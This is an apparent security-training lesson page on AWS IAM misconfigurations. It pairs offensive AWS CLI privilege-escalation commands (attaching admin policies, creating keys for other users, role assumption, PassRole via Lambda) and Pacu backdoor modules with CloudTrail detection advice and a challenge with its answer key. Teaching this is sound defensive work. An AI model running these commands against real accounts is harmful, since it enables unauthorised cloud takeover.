@@ -1,0 +1,259 @@
+---
+title: "AWS IAM Misconfigurations"
+description: "Learn to identify and exploit common AWS Identity and Access Management vulnerabilities."
+difficulty: "Advanced"
+estimatedTime: "50 minutes"
+tags: ["cloud-security", "aws", "iam", "pentesting"]
+---
+
+# AWS IAM Misconfigurations
+
+<InfoBox type="tip" title="Cloud is the New Perimeter">
+In 2024+, misconfigurations are the **#1 cause** of cloud breaches. IAM flaws can give attackers access to your entire AWS kingdom.
+</InfoBox>
+
+## Understanding AWS IAM
+
+**Identity and Access Management (IAM)** controls WHO can do WHAT in AWS.
+
+### Key IAM Components
+
+| Component | Description |
+|-----------|-------------|
+| **Users** | Individual identities (humans or services) |
+| **Groups** | Collections of users with shared permissions |
+| **Roles** | Temporary credentials for AWS services or cross-account access |
+| **Policies** | JSON documents defining permissions |
+
+---
+
+## Common IAM Misconfigurations
+
+### 1. Overly Permissive Policies
+
+<TerminalWindow title="Dangerous: Admin Access to Everyone">
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": "*",
+            "Resource": "*"
+        }
+    ]
+}
+
+# This grants FULL admin access!
+# Never use "*" for both Action and Resource
+</TerminalWindow>
+
+### 2. Wildcard Permissions
+
+<TerminalWindow title="Misconfiguration Examples">
+# Too permissive - allows all S3 actions
+"Action": "s3:*"
+
+# Too permissive - allows access to all resources
+"Resource": "*"
+
+# Better - specific actions and resources
+"Action": ["s3:GetObject", "s3:PutObject"]
+"Resource": "arn:aws:s3:::my-bucket/*"
+</TerminalWindow>
+
+### 3. Principal Confusion
+
+<TerminalWindow title="Dangerous Trust Policy">
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Principal": "*",
+            "Action": "sts:AssumeRole"
+        }
+    ]
+}
+
+# Anyone on the internet can assume this role!
+</TerminalWindow>
+
+---
+
+## Exploitation Techniques
+
+### Privilege Escalation Paths
+
+<TerminalWindow title="Common Privilege Escalation Methods">
+# 1. CreatePolicyVersion - Create new version as default
+aws iam create-policy-version --policy-arn $ARN \
+    --policy-document file://admin-policy.json --set-as-default
+
+# 2. AttachUserPolicy - Attach admin policy to self
+aws iam attach-user-policy --user-name attacker \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# 3. CreateAccessKey - Create new keys for another user
+aws iam create-access-key --user-name admin
+
+# 4. AssumeRole - Assume a more privileged role
+aws sts assume-role --role-arn arn:aws:iam::123456789:role/admin \
+    --role-session-name hacked
+
+# 5. PassRole + Lambda - Create Lambda with privileged role
+aws lambda create-function --function-name exploit \
+    --role arn:aws:iam::123456789:role/admin-role \
+    --runtime python3.9 --handler index.handler \
+    --zip-file fileb://exploit.zip
+</TerminalWindow>
+
+### Enumeration Commands
+
+<TerminalWindow title="AWS IAM Enumeration">
+# Who am I?
+aws sts get-caller-identity
+
+# List my policies
+aws iam list-attached-user-policies --user-name $USER
+aws iam list-user-policies --user-name $USER
+
+# Get policy details
+aws iam get-policy --policy-arn $POLICY_ARN
+aws iam get-policy-version --policy-arn $ARN --version-id v1
+
+# List roles I can assume
+aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal == "*")'
+
+# Check for privilege escalation permissions
+# Look for: iam:CreatePolicy, iam:AttachUserPolicy, iam:PassRole, etc.
+</TerminalWindow>
+
+---
+
+## Tools for IAM Analysis
+
+| Tool | Purpose |
+|------|---------|
+| **Pacu** | AWS exploitation framework |
+| **ScoutSuite** | Multi-cloud security auditing |
+| **Prowler** | AWS security best practices |
+| **CloudMapper** | AWS environment visualization |
+| **PMapper** | IAM privilege escalation paths |
+
+<TerminalWindow title="Using Pacu">
+# Install Pacu
+$ git clone https://github.com/RhinoSecurityLabs/pacu.git
+$ cd pacu && pip install -r requirements.txt
+$ python pacu.py
+
+# In Pacu
+Pacu> import_keys --all
+Pacu> run iam__enum_permissions
+Pacu> run iam__privesc_scan
+Pacu> run iam__backdoor_users_keys
+</TerminalWindow>
+
+---
+
+## Detection & Defense
+
+### CloudTrail Events to Monitor
+
+<TerminalWindow title="Suspicious IAM Events">
+# High-risk events to alert on:
+- CreateUser
+- AttachUserPolicy
+- AttachRolePolicy
+- CreatePolicyVersion
+- UpdateAssumeRolePolicy
+- CreateAccessKey
+- PutUserPolicy
+- DeleteTrail (covering tracks)
+</TerminalWindow>
+
+### Best Practices
+
+1. **Least Privilege** - Only grant what's needed
+2. **Use Roles** - Avoid long-term access keys
+3. **Enable MFA** - For all human users
+4. **Rotate Credentials** - Regularly rotate access keys
+5. **Use AWS Organizations SCPs** - Guardrails across accounts
+
+---
+
+<ChallengeBox 
+  title="Find the Privilege Escalation"
+  difficulty="hard"
+  points={200}
+>
+
+You've compromised an AWS user with the following permissions:
+
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": [
+                "iam:CreatePolicyVersion",
+                "iam:ListPolicies",
+                "iam:GetPolicy"
+            ],
+            "Resource": "*"
+        }
+    ]
+}
+```
+
+**Questions**:
+1. Can you escalate privileges? How?
+2. What would you create in the new policy version?
+3. How would a defender detect this?
+
+<details>
+<summary>Answer</summary>
+
+**1. Yes!** `iam:CreatePolicyVersion` allows creating a new version of ANY policy and setting it as default.
+
+**2. Create admin policy**:
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [{
+        "Effect": "Allow",
+        "Action": "*",
+        "Resource": "*"
+    }]
+}
+```
+
+**3. Detection**:
+- CloudTrail alert on `CreatePolicyVersion` events
+- Monitor for policies being modified by non-admin users
+- Use AWS Config rules to detect overly permissive policies
+
+</details>
+</ChallengeBox>
+
+---
+
+## Key Takeaways
+
+- **IAM misconfigurations** are the top cloud security risk
+- Always check for **privilege escalation paths**
+- Use tools like **Pacu** and **PMapper** for analysis
+- Monitor **CloudTrail** for suspicious IAM changes
+- Apply **least privilege** religiously
+
+<Quiz
+  question="Which IAM permission allows an attacker to potentially escalate to full administrator access?"
+  options={[
+    "iam:ListUsers",
+    "iam:CreatePolicyVersion",
+    "s3:GetObject",
+    "ec2:DescribeInstances"
+  ]}
+  correctIndex={1}
+  explanation="iam:CreatePolicyVersion allows creating new versions of any policy the user has access to, including setting the new version as default with escalated permissions."
+/>
